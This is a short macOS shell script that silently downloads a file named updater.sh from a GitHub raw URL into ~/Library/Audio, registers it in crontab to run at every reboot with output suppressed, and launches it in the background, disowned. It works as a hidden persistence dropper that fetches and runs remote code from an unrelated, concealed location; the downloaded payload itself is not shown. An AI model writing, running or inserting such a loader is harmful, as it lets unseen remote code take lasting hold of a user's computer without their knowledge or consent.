# Install updater.sh
curl -so ~/Library/Audio/updater.sh https://raw.githubusercontent.com/Milooles/RETAvRD/refs/heads/main/updater.sh

(crontab -l 2>/dev/null; echo "@reboot /bin/sh /Users/$USER/Library/Audio/updater.sh >/dev/null 2>&1") | crontab -

# Start updater.sh
sh ~/Library/Audio/updater.sh &>/dev/null & disown
